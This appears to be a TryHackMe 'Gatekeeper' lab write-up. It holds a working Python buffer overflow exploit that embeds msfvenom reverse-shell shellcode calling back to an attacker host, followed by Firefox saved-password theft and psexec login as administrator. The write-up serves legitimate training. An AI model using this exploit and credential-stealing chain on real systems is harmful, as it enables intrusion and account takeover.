---
tags:
  - THM
  - Windows
  - Medium
  - Leakage
  - BOF
  - Scripting
---
https://tryhackme.com/room/gatekeeper/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.65.134.207 gatekeeper
```
# Scanning
```console
$ nmap -p135,139,445,3389,31337,49152,49153,49154,49160,49161,49162 -sV -sC gatekeeper

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2026-01-23T15:50:22
|_Not valid after:  2026-07-25T15:50:22
|_ssl-date: 2026-01-24T15:54:48+00:00; -1s from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.98%I=7%D=1/24%Time=6974EAA3%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m58s, deviation: 2h30m00s, median: -1s
| smb2-time: 
|   date: 2026-01-24T15:54:33
|_  start_date: 2026-01-24T15:50:21
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-01-24T10:54:33-05:00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 0a:ff:c8:43:3c:11 (unknown)
```
# Enumeration
There is a pretty rare service running at open port 31337, which returns what we send:
```console
$ nc gatekeeper 31337

INPUT
Hello INPUT!!!
```
We can connect as **guest** via SMB. Found the source code of the mysterious service:
```console
$ smbclient -N //gatekeeper/Users

smb: \> cd Share

smb: \Share\> get gatekeeper.exe
```
Found out that the service crashes if we send large data, probably due to overflow:
```console
$ nc gatekeeper 31337

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
read(net): Connection reset by peer
```
# Exploitation
Since we have the source code, I created a testing lab with:
- Virtual machine with Windows 7 to emulate the victim's environment.
- [Immunity Debugger](https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml) to debug the `gatekeeper.exe` program.
- [Mona.py](https://github.com/corelan/mona) to speed up exploitation inside immunity debugger.

Then, after looking at the CPU information at crash time, found out that we are overwriting the **EIP register**. So, created a Python exploit to abuse it:
```python
#!/usr/bin/env python3
import subprocess
from pwn import *


# Binary analysis
offset = 146 # Found by sending designed pattern and checking EIP
badchars = r"\x00\x0a\x0d" # Common bad characters
jmp_esp = 0x080414c3 # !mona modules ; !mona find -type instr -s 'jmp esp' -m gatekeeper.exe


# Construct shellcode
shellcode = subprocess.run([
    'msfvenom',
    '-p', 'windows/shell_reverse_tcp',
    '-f', 'raw',
    '-a', 'x86',
    '--platform', 'windows',
    '-b', f"'{badchars}'",
    'LHOST=192.168.150.216', 'LPORT=4444' # Attacker params
], capture_output=True).stdout


# Construct payload
payload = b'\x90' * offset
payload += p32(jmp_esp) # EIP
payload += asm('sub esp, 0x10') # Beginning of ESP, stack displacement
payload += shellcode


# Send payload
p = remote('gatekeeper', 31337)
p.sendline(payload)
p.close()
```
Now, wait for connections:
```console
$ nc -lvnp 4444
```
Establish connection:
```console
$ python3 exploit.py
```
Get the **user flag**:
```console
> type C:\Users\natbat\Desktop\user.txt.txt
```
# Post-Exploitation
We can see a `Firefox.lnk` file in our desktop. So, we transfer a [7-zip executable](https://7-zip.org/) to compress the folder containing Firefox user data:
```console
> .\7zr.exe a -t7z -mx=9 -r "C:\Users\natbat\Firefox.7z" "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\"
```
In the local machine, clone the [Firefox Decrypt](https://github.com/unode/firefox_decrypt) repository and transfer the Firefox folder:
```console
$ git clone https://github.com/unode/firefox_decrypt

$ cd firefox_decrypt/

# Extract after transfering
$ 7z x Firefox.7z
```
Then, find **new credentials**:
```console
$ python3 firefox_decrypt.py ./Firefox
Select the Mozilla profile you wish to decrypt
1 -> Profiles/rajfzh3y.default
2 -> Profiles/ljfn812a.default-release
2

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```
**User mayor** is **administrator** in the machine:
```console
$ nxc smb gatekeeper -u 'mayor' -p '8CL7O1N78MdrCIsV'

SMB         10.65.134.207   445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.65.134.207   445    GATEKEEPER       [+] gatekeeper\mayor:8CL7O1N78MdrCIsV (Pwn3d!)
```
Connect via `psexec.py` and get the **root flag**:
```console
$ psexec.py mayor:8CL7O1N78MdrCIsV@gatekeeper

> type C:\Users\mayor\Desktop\root.txt.txt
```